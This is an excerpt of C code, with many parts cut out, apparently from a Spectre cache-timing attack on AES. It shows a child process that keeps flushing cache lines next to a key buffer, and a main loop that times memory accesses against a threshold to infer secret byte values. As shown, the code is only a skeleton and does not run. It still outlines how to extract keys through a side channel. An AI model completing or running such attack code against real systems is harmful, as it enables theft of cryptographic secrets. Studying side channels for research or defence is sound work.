...
{       
    for(size_t i = 0; i < 100; i++) //i < 100 is the original
    {
...
int main(int ac, char **av)
{
  ...
  printf("/------------- LAUNCHING SPECTRE ATTACK ON AES -------------/\n");
  ...
  //child process. Continually flushes the cache.
  {
    ...
    while(value)
    {
      flush( (void*)(( (uintptr_t)aeskey2) + 240), 64);
    }
  }
  else
  {
  //Main proess. Training loop commences.
    for(int sample = 0; sample < Nsamples; sample++)
    {
      ...
      for(int i = 0; i<256; i++)
      {
        ...
        if(timeTaken < threshold && i != expected) //
        {
             //successes[i]++;
